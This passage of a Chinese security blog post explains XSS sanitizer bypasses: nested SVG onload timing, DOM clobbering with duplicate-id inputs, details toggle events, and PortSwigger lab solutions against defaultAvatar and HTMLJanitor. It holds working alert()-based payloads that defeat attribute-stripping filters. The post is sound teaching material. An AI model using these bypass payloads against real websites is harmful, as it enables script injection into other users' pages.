class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;notify&quot;&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;</span><br><span class=\"line\">\t\t&lt;b&gt;Meme&lt;/b&gt; </span><br><span class=\"line\">\t\tcreated from </span><br><span class=\"line\">\t\t&lt;img name=&quot;notify&quot;&gt;</span><br><span class=\"line\">\t\t&lt;style&gt;&lt;style&gt;&lt;/style&gt;</span><br><span class=\"line\">\t\t&lt;script&gt;alert()//&lt;/style&gt;&lt;/div&gt;&lt;/script&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"svg深入研究\"><a class=\"markdownIt-Anchor\" href=\"#svg深入研究\">#</a> &lt;svg&gt; 深入研究</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">data</span> = <span class=\"title function_ invoke__\">decodeURIComponent</span>(location.hash.<span class=\"title function_ invoke__\">substr</span>(<span class=\"number\">1</span>));</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">root</span> = document.<span class=\"title function_ invoke__\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">         el.<span class=\"title function_ invoke__\">removeAttribute</span>(name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">document.body.<span class=\"title function_ invoke__\">appendChild</span>(root)</span><br></pre></td></tr></table></figure>\n<p>HTML5 中 innerHtml 不执行插入的 <code>&lt;script&gt;</code>  标签</p>\n<p><strong>移除元素后，元素向前补，但指针向后移，导致没有完全移除所有元素</strong></p>\n<p>exp:  <code>&lt;img a src='a' b onerror=alert(1)&gt;</code></p>\n<p>因此我们一般不在同一个数组边循环边删除</p>\n<p>修复：先追加到数组中，在移除，即不要在源数组上操作</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     let attrs = []</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">         attrs.<span class=\"title function_ invoke__\">push</span>(attr.name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let name of attrs) &#123;</span><br><span class=\"line\">         el.<span class=\"title function_ invoke__\">removeAttribute</span>(name)</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">document.body.<span class=\"title function_ invoke__\">appendChild</span>(root); </span><br></pre></td></tr></table></figure>\n<p>使用以上修复后</p>\n<p>1. 别进循环</p>\n<p>2. 进循环别删有用数据</p>\n<p>method 1.(利用 html 页面渲染的竞争时间)</p>\n<p><code>&lt;svg&gt;&lt;svg onload=alert(1)&gt;</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM2MDcyNzk4NTEtY2UyNDFlNTItZDM4ZS00NWRjLTllZGMtODkxMTM2YTQ5OGI4Lm1k\">📎svg 的深度利用来绕过 waf.md</span></p>\n<p>1.1  <code>&lt;img src='1' onerror=&quot;alert(1)&quot;&gt;</code>  失败原因</p>\n<p>那么很明显， <code>alert(1)</code>  是在页面上 script 标签中的代码全部执行完毕以后才被调用的。这里涉及到浏览器渲染的另外一部分内容： <strong>在 DOM 树构建完成以后，就会触发</strong> <code>DOMContentLoaded</code>  事件，接着加载脚本、图片等外部文件，全部加载完成之后触发 <code>load</code> <strong> 事件</strong>。</p>\n<p>页面的 JS 执行是会阻塞 DOM 树构建的。<strong>所以总的来说，在 script 标签内的 JS 执行完毕以后，DOM 树才会构建完成，接着才会加载图片，然后发现加载内容出错才会触发</strong> <code>error</code> <strong> 事件</strong>。</p>\n<p>由于 js 阻塞 dom 树，一直到 js 语句执行结束后，才可以引入 img，此时 img 的属性已经被 sanitizer 清除了，自然也不可能执行事件代码了。</p>\n<p>1.2 <code>&lt;svg&gt;&lt;svg onload=alert(1)&gt; </code> 可以弹窗原因</p>\n<p>两个 svg 时，直接弹出了窗口，点击确定以后，调试器才会走到下一行代码，没有执行移除属性的代码。而且，这个地方如果只有一个 <code>&lt;svg onload=alert(1)&gt;</code> ，那么结果将同 img 一样，直到 script 标签结束以后才能执行相关的代码，这样的代码放到挑战里也将失败</p>\n<p>当我们没有正确闭合标签的时候，如 <code>&lt;svg&gt;&lt;svg&gt;</code> ，就可能调用到 <code>PopAll</code>  来清理；而正确闭合的标签就可能调用到其他出栈函数并调用到 <code>PopCommon</code> 。这两个函数有一个共同点，都会调用栈中元素的 <code>FinishParsingChildren</code>  函数。这个函数用于处理子节点解析完毕以后的工作。</p>\n<p><code>FinishParsingChildren</code>  有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>\n<p>最外层 svg 的 <code>load</code>  事件由 <code>LocalDOMWindow::dispatchWindowLoadEvent</code>  触发；而其他 svg 的 <code>load</code>  事件则在达到结束标记的时候触发。</p>\n<p>先决条件 在于 svg 不能最外层， onload 必须保证不是最外层属性，不是最外层 onload 会在 innerHTML 之前执行</p>\n<p>当没有过滤代码时： <code>&lt;svg onload=console.log(&quot;svg0&quot;)&gt;&lt;svg onload=console.log(&quot;svg1&quot;)&gt;&lt;svg onload=console.log(&quot;svg2&quot;)&gt;</code></p>\n<p>触发顺序为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg2</span><br><span class=\"line\">svg1</span><br><span class=\"line\">DOMContentLoaded</span><br><span class=\"line\">svg0</span><br><span class=\"line\">load</span><br></pre></td></tr></table></figure>\n<p>套嵌的 svg 之所以成功，是因为当页面为 <code>root.innerHtml</code>  赋值的时候浏览器进入 DOM 树构建过程；在这个过程中<strong>会触发非最外层 svg 标签的 <code>load</code>  事件，最终成功执行代码</strong>。所以，sanitizer 执行的时间点在这之后，无法影响我们的 payload。</p>\n<p>1.3 <code>&lt;svg onload=alert(1)&gt;</code>  失败原因</p>\n<p>这里有一个非常明显的判断 <code>IsOutermostSVGSVGElement</code> ，如果是最外层的 svg 则直接返回。</p>\n<p><code>&lt;svg onload=console.log(&quot;svg0&quot;)&gt;&lt;svg onload=console.log(&quot;svg1&quot;)&gt;&lt;svg onload=console.log(&quot;svg2&quot;)&gt;</code></p>\n<p>最内层的 svg 先触发，然后再到下一层，而且是在 DOM 树构建完成以前就触发了相关事件；最外层的 svg 则得等到 DOM 树构建完成才能触发。</p>\n<p>method 2. 使用 input 破坏 DOM</p>\n<p><code>&lt;style&gt;@keyframes x&#123;&#125;&lt;/style&gt;</code>   <code>&lt;form style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;</code>   <code>&lt;input id=&quot;attributes&quot;&gt;&lt;input id=&quot;attributes&quot;&gt;</code></p>\n<p>此时 for 循环中 el.attributes 抓到的是 form 的子标签，form 没有执行循环</p>\n<p>或者</p>\n<p><code>&lt;form tabindex=1 onfocus=&quot;alert(1);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;img id=attributes&gt;&lt;img id=attributes&gt;&lt;/form&gt;</code></p>\n<p><code>&lt;form tabindex=1 onfocus=&quot;alert(1);this.removeAttribute('onfocus');&quot; autofocus=true&gt; &lt;input id=attributes&gt;&lt;input id=attributes&gt;&lt;/form&gt;</code></p>\n<p>tabindex 的作用：</p>\n<p>设置 tab 选中的标签，tabindex=1 或 - 1，代表开始就选中，如果只有一个，只要有 tabindex 默认就选中</p>\n<p>需要两个 input 因为有两个 input 时组成了一个 htmlcollection，是可迭代对象。删除 name 的属性后 input 标签仍然可以 onfocus 实现弹窗</p>\n<p>onfoucs 是 input 属性，form 中必须有 input 才能聚焦</p>\n<p>method 3. 利用 details 弹窗</p>\n<p><code>ParseAttribute</code>  正是在解析文档处理标签属性的时候被调用的。注释也写到了，分发 toggle 事件的操作是异步的。</p>\n<p><strong>details 标签的 toggle 事件是异步触发的，并且直接对 details 标签的移除不会清除原先通过属性设置的异步任务</strong></p>\n<p>将 details 改为同步执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">data</span> = <span class=\"title function_ invoke__\">decodeURIComponent</span>(location.hash.<span class=\"title function_ invoke__\">substr</span>(<span class=\"number\">1</span>));;</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">root</span> = document.<span class=\"title function_ invoke__\">createElement</span>(<span class=\"string\">&#x27;div&#x27;</span>);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">setTimeout</span>( () =&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (let el of root.<span class=\"title function_ invoke__\">querySelectorAll</span>(<span class=\"string\">&#x27;*&#x27;</span>)) &#123;</span><br><span class=\"line\">     let attrs = [];</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let attr of el.attributes) &#123;</span><br><span class=\"line\">      attrs.<span class=\"title function_ invoke__\">push</span>(attr.name);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (let name of attrs) &#123;</span><br><span class=\"line\">      el.<span class=\"title function_ invoke__\">removeAttribute</span>(name);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">    document.body.<span class=\"title function_ invoke__\">appendChild</span>(root)</span><br><span class=\"line\">&#125; , <span class=\"number\">2000</span>)</span><br></pre></td></tr></table></figure>\n<p>这样保证了 alert 一定会在 js 删除之前执行，执行点在 innerHTML</p>\n<p>如果没有弹出，可能在 js 删除之后才执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const data = decodeURIComponent(location.hash.substr(1));;</span><br><span class=\"line\">const root = document.createElement(&#x27;div&#x27;);</span><br><span class=\"line\">root.innerHTML = data;</span><br><span class=\"line\"></span><br><span class=\"line\">let details = root.querySelector(&quot;details&quot;)</span><br><span class=\"line\">root.removeChild(details)</span><br><span class=\"line\"></span><br><span class=\"line\">for (let el of root.querySelectorAll(&#x27;*&#x27;)) &#123;</span><br><span class=\"line\"> let attrs = [];</span><br><span class=\"line\"> for (let attr of el.attributes) &#123;</span><br><span class=\"line\">  attrs.push(attr.name);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> for (let name of attrs) &#123;</span><br><span class=\"line\">  el.removeAttribute(name);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>details 异步执行是将执行函数放入一个事件队列中，只要事件不停止，在放入事件队列中，删除 details 已经没用，事件队列仍会执行</p>\n<p>details 有延迟的话肯定执行成功，因为此时异步事件已经执行完成，执行点在 innerhtml 如果没有延迟，有可能在 js 删除属性之后，异步事件才执行完成</p>\n<h2 id=\"dom-clobbering-burp-suite\"><a class=\"markdownIt-Anchor\" href=\"#dom-clobbering-burp-suite\">#</a> Dom Clobbering - Burp Suite</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM4MDkwNjM2NzktYzAxY2IzM2EtYWQ2MS00ZTg0LTg2MTgtZGU1M2E4MjI4YjU4Lm1k\">📎Exploiting DOM clobbering to enable XSS.md</span></p>\n<h3 id=\"lab-exploiting-dom-clobbering-to-enable-xss\"><a class=\"markdownIt-Anchor\" href=\"#lab-exploiting-dom-clobbering-to-enable-xss\">#</a> Lab: Exploiting DOM clobbering to enable XSS</h3>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function displayComments(comments) &#123;</span><br><span class=\"line\">    let userComments = document.getElementById(&quot;user-comments&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    for (let i = 0; i &lt; comments.length; ++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        comment = comments[i];</span><br><span class=\"line\">        let commentSection = document.createElement(&quot;section&quot;);</span><br><span class=\"line\">        commentSection.setAttribute(&quot;class&quot;, &quot;comment&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        let firstPElement = document.createElement(&quot;p&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        let defaultAvatar = window.defaultAvatar || &#123;avatar: &#x27;/resources/images/avatarDefault.svg&#x27;&#125;</span><br><span class=\"line\">        let avatarImgHTML = &#x27;<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;avatar&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;&#x27; + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + &#x27;&quot;</span>&gt;</span>&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">        let divImgContainer = document.createElement(&quot;div&quot;);</span><br><span class=\"line\">        divImgContainer.innerHTML = avatarImgHTML</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">test1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">test1</span> <span class=\"attr\">name</span>=<span class=\"string\">test2</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">返回HTMLCollection(2) [a#test1, a#test1, test1: a#test1, test2: a#test1]</span><br><span class=\"line\">通过test1取到collections中，test2取到第二个a</span><br><span class=\"line\">--&gt; window.test1.test2</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;test2&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">--&gt; node.attributes.length </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href=&quot;cid:&amp;quot;onerror=alert(2)&quot;//&gt;</span><br><span class=\"line\">&lt;a id=defaultAvatar href=&quot;&quot;&gt;</span><br><span class=\"line\">&lt;a id=defaultAvatar name=avatar href=&quot;1:&amp;quot;onerror=alert(1)//&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>这里很明显我们可以用 Dom Clobbering 来控制  <code>window.defaultAvatar</code> ，只要我们原来没有头像就可以用一个构造一个 <code>defaultAvatar.avatar</code>  进行 XSS 了。</p>\n<p>触发后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img class=&quot;avatar&quot; src=&quot;cid:&quot; onerror=&quot;alert(1)&quot;//&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>href 中的内容需要符合 dompurify 中的协议</p>\n<p>至于为什么要用 a 标签，在 ok boomer 中有详细解释，因为 a 标签不继承 tostring 方法</p>\n<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。最终把 href 中的内容放入 img 的 src 中</p>\n<h3 id=\"labclobbering-dom-attributes-to-bypass-html-filters\"><a class=\"markdownIt-Anchor\" href=\"#labclobbering-dom-attributes-to-bypass-html-filters\">#</a> Lab:Clobbering DOM attributes to bypass HTML filters</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTMLJanitor.prototype.clean = function (html) &#123;</span><br><span class=\"line\">const sandbox = document.implementation.createHTMLDocument(&#x27;&#x27;);</span><br><span class=\"line\">const root = sandbox.createElement(&quot;div&quot;);</span><br><span class=\"line\">root.innerHTML = html;</span><br><span class=\"line\"></span><br><span class=\"line\">this._sanitize(sandbox, root);</span><br><span class=\"line\"></span><br><span class=\"line\">return root.innerHTML;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">HTMLJanitor</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">_sanitize</span> = <span class=\"keyword\">function</span> (<span class=\"params\"><span class=\"variable language_\">document</span>, parentNode</span>) &#123;                                                                           </span><br><span class=\"line\"><span class=\"keyword\">var</span> treeWalker = <span class=\"title function_\">createTreeWalker</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\"><span class=\"keyword\">var</span> node = treeWalker.<span class=\"title function_\">firstChild</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!node) &#123; <span class=\"keyword\">return</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (node.<span class=\"property\">nodeType</span> === <span class=\"title class_\">Node</span>.<span class=\"property\">TEXT_NODE</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// If this text node is just whitespace and the previous or next element</span></span><br><span class=\"line\">    <span class=\"comment\">// sibling is a block element, remove it</span></span><br><span class=\"line\">    <span class=\"comment\">// N.B.: This heuristic could change. Very specific to a bug with</span></span><br><span class=\"line\">    <span class=\"comment\">// `contenteditable` in Firefox: http://jsbin.com/EyuKase/1/edit?js,output</span></span><br><span class=\"line\">    <span class=\"comment\">// <span class=\"doctag\">FIXME:</span> make this an option?</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (node.<span class=\"property\">data</span>.<span class=\"title function_\">trim</span>() === <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">        &amp;&amp; ((node.<span class=\"property\">previousElementSibling</span> &amp;&amp; <span class=\"title function_\">isBlockElement</span>(node.<span class=\"property\">previousElementSibling</span>))</span><br><span class=\"line\">             || (node.<span class=\"property\">nextElementSibling</span> &amp;&amp; <span class=\"title function_\">isBlockElement</span>(node.<span class=\"property\">nextElementSibling</span>)))) &#123;</span><br><span class=\"line\">      parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Remove all comments</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (node.<span class=\"property\">nodeType</span> === <span class=\"title class_\">Node</span>.<span class=\"property\">COMMENT_NODE</span>) &#123;</span><br><span class=\"line\">    parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isInline = <span class=\"title function_\">isInlineElement</span>(node);</span><br><span class=\"line\">  <span class=\"keyword\">var</span> containsBlockElement;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (isInline) &#123;</span><br><span class=\"line\">    containsBlockElement = <span class=\"title class_\">Array</span>.<span class=\"property\"><span class=\"keyword\">prototype</span></span>.<span class=\"property\">some</span>.<span class=\"title function_\">call</span>(node.<span class=\"property\">childNodes</span>, isBlockElement);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Block elements should not be nested (e.g. &lt;li&gt;&lt;p&gt;...); if</span></span><br><span class=\"line\">  <span class=\"comment\">// they are, we want to unwrap the inner block element.</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isNotTopContainer = !! parentNode.<span class=\"property\">parentNode</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> isNestedBlockElement =</span><br><span class=\"line\">        <span class=\"title function_\">isBlockElement</span>(parentNode) &amp;&amp;</span><br><span class=\"line\">        <span class=\"title function_\">isBlockElement</span>(node) &amp;&amp;</span><br><span class=\"line\">        isNotTopContainer;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> nodeName = node.<span class=\"property\">nodeName</span>.<span class=\"title function_\">toLowerCase</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> allowedAttrs = <span class=\"title function_\">getAllowedAttrs</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>, nodeName, node);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Drop tag entirely according to the whitelist *and* if the markup</span></span><br><span class=\"line\">  <span class=\"comment\">// is invalid.</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (isInvalid || <span class=\"title function_\">shouldRejectNode</span>(node, allowedAttrs)</span><br><span class=\"line\">      || (!<span class=\"variable language_\">this</span>.<span class=\"property\">config</span>.<span class=\"property\">keepNestedBlockElements</span> &amp;&amp; isNestedBlockElement)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (! (node.<span class=\"property\">nodeName</span> === <span class=\"string\">&#x27;SCRIPT&#x27;</span> || node.<span class=\"property\">nodeName</span> === <span class=\"string\">&#x27;STYLE&#x27;</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> (node.<span class=\"property\">childNodes</span>.<span class=\"property\">length</span> &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        parentNode.<span class=\"title function_\">insertBefore</span>(node.<span class=\"property\">childNodes</span>[<span class=\"number\">0</span>], node);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    parentNode.<span class=\"title function_\">removeChild</span>(node);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">_sanitize</span>(<span class=\"variable language_\">document</span>, parentNode);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// Sanitize attributes</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> a = <span class=\"number\">0</span>; a &lt; node.<span class=\"property\">attributes</span>.<span class=\"property\">length</span>; a += <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> attr = node.<span class=\"property\">attributes</span>[a];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_\">shouldRejectAttr</span>(attr, allowedAttrs, node)) 